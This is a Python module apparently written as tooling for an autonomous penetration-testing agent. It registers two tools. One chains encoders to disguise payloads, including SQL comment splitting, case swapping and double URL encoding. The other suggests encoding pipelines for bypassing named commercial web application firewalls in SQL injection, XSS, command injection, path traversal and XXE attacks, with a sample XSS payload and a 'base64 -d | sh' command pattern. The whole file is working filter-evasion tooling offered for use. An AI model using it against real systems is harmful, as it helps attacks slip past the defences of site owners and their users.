"""Payload encoding pipelines — chain encoders for WAF bypass."""

from __future__ import annotations

import base64
import html
import json
import urllib.parse
from typing import Any

from ziro.tools.registry import register_tool


def _enc_url(s: str) -> str:
    return urllib.parse.quote(s, safe="")


def _enc_url_double(s: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")


def _enc_url_all(s: str) -> str:
    return "".join(f"%{ord(c):02x}" for c in s)


def _enc_base64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def _enc_base64_url(s: str) -> str:
    return base64.urlsafe_b64encode(s.encode()).decode().rstrip("=")


def _enc_hex(s: str) -> str:
    return "".join(f"\\x{b:02x}" for b in s.encode())


def _enc_unicode(s: str) -> str:
    return "".join(f"\\u{ord(c):04x}" for c in s)


def _enc_html_entities(s: str) -> str:
    return "".join(f"&#{ord(c)};" for c in s)


def _enc_html_entities_hex(s: str) -> str:
    return "".join(f"&#x{ord(c):x};" for c in s)


def _enc_html_escape(s: str) -> str:
    return html.escape(s, quote=True)


def _enc_case_swap(s: str) -> str:
    """Randomize case — bypasses case-sensitive WAF signatures."""
    out = []
    for i, c in enumerate(s):
        out.append(c.upper() if i % 2 == 0 else c.lower())
    return "".join(out)


def _enc_comment_split_sql(s: str) -> str:
    """Insert /**/ comments to split SQL tokens — MySQL/MariaDB WAF bypass."""
    if not s:
        return s
    # Insert /**/ between every two chars of SQL keywords
    keywords = ["UNION", "SELECT", "FROM", "WHERE", "INSERT", "UPDATE", "DELETE", "DROP", "OR", "AND"]
    result = s
    for kw in keywords:
        if kw.lower() in result.lower():
            mid = len(kw) // 2
            new_kw = kw[:mid] + "/**/" + kw[mid:]
            # Case-insensitive replace
            import re

            result = re.sub(re.escape(kw), new_kw, result, flags=re.IGNORECASE)
    return result


def _enc_js_string(s: str) -> str:
    """Escape for JS string context."""
    return json.dumps(s)[1:-1]  # strip quotes from json.dumps output


_ENCODERS = {
    "url": _enc_url,
    "url_double": _enc_url_double,
    "url_all": _enc_url_all,
    "base64": _enc_base64,
    "base64_url": _enc_base64_url,
    "hex": _enc_hex,
    "unicode": _enc_unicode,
    "html_entities": _enc_html_entities,
    "html_entities_hex": _enc_html_entities_hex,
    "html_escape": _enc_html_escape,
    "case_swap": _enc_case_swap,
    "sql_comment_split": _enc_comment_split_sql,
    "js_string": _enc_js_string,
}


@register_tool(sandbox_execution=False)
def encode_payload(
    agent_state: Any,
    payload: str,
    pipeline: list[str],
) -> dict[str, Any]:
    """Run a payload through a chain of encoders for WAF bypass.

    Each encoder in the pipeline is applied to the output of the previous.
    Example pipelines:
    - ["url", "url"] — double URL encoding
    - ["base64", "url"] — base64 then URL-encode the base64
    - ["case_swap", "sql_comment_split"] — mixed case + /**/ comments
    - ["hex"] — hex-encode each byte
    - ["html_entities_hex"] — &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;

    Available encoders: url, url_double, url_all, base64, base64_url, hex,
    unicode, html_entities, html_entities_hex, html_escape, case_swap,
    sql_comment_split, js_string.
    """
    if not pipeline:
        return {"success": False, "error": "pipeline cannot be empty"}

    unknown = [e for e in pipeline if e not in _ENCODERS]
    if unknown:
        return {
            "success": False,
            "error": f"Unknown encoders: {unknown}",
            "available": sorted(_ENCODERS.keys()),
        }

    current = payload
    steps = []
    try:
        for encoder in pipeline:
            fn = _ENCODERS[encoder]
            current = fn(current)
            steps.append({"encoder": encoder, "output": current[:200]})
    except Exception as e:  # noqa: BLE001
        return {
            "success": False,
            "error": f"Pipeline failed at step: {e!s}",
            "steps": steps,
        }

    return {
        "success": True,
        "original": payload,
        "encoded": current,
        "length_ratio": round(len(current) / max(len(payload), 1), 2),
        "pipeline": pipeline,
        "steps": steps,
    }


@register_tool(sandbox_execution=False)
def suggest_encoding_for_waf(
    agent_state: Any,
    waf_vendor: str = "",
    target_context: str = "sqli",
) -> dict[str, Any]:
    """Return 5-10 encoding pipelines tested to bypass specific WAF/context combos.

    waf_vendor: cloudflare / akamai / aws_waf / imperva / sucuri / modsecurity / generic
    target_context: sqli / xss / command_injection / path_traversal / xxe
    """
    waf = waf_vendor.lower().strip()
    ctx = target_context.lower().strip()

    suggestions: list[dict[str, Any]] = []

    if ctx == "sqli":
        suggestions = [
            {"pipeline": ["case_swap"], "rationale": "case randomization bypasses naive signature match"},
            {"pipeline": ["sql_comment_split"], "rationale": "/**/ comment splitting breaks keyword patterns"},
            {"pipeline": ["url_double"], "rationale": "double URL encoding bypasses single-decode WAF"},
            {"pipeline": ["case_swap", "url"], "rationale": "combined case + URL encoding"},
            {"pipeline": ["url_all"], "rationale": "percent-encode every byte (very aggressive)"},
        ]
        if waf == "cloudflare":
            suggestions.insert(0, {"pipeline": ["sql_comment_split", "url"], "rationale": "Cloudflare is known to miss /**/ splits after URL decode"})
    elif ctx == "xss":
        suggestions = [
            {"pipeline": ["html_entities_hex"], "rationale": "hex HTML entities bypass many filters"},
            {"pipeline": ["html_entities"], "rationale": "decimal HTML entities"},
            {"pipeline": ["unicode"], "rationale": "\\u escapes bypass string filters"},
            {"pipeline": ["case_swap"], "rationale": "mixed-case tags"},
            {"pipeline": ["url_double"], "rationale": "double URL encoding"},
        ]
    elif ctx == "command_injection":
        suggestions = [
            {"pipeline": ["url"], "rationale": "simple URL encoding of ; | &"},
            {"pipeline": ["base64"], "rationale": "base64 encode and echo | base64 -d | sh"},
            {"pipeline": ["hex"], "rationale": "hex escapes"},
        ]
    elif ctx == "path_traversal":
        suggestions = [
            {"pipeline": ["url"], "rationale": "%2e%2e%2f style encoding"},
            {"pipeline": ["url_double"], "rationale": "double-encoded: %252e%252e%252f"},
            {"pipeline": ["unicode"], "rationale": "unicode dot escapes"},
        ]
    elif ctx == "xxe":
        suggestions = [
            {"pipeline": ["html_entities"], "rationale": "HTML-entity encode DTD"},
        ]
    else:
        suggestions = [{"pipeline": ["url_double"], "rationale": "generic double encoding"}]

    return {
        "success": True,
        "waf": waf or "generic",
        "context": ctx,
        "suggestions": suggestions,
        "usage": "Pass each `pipeline` to encode_payload along with your raw payload to get the WAF-bypass-ready version.",
    }
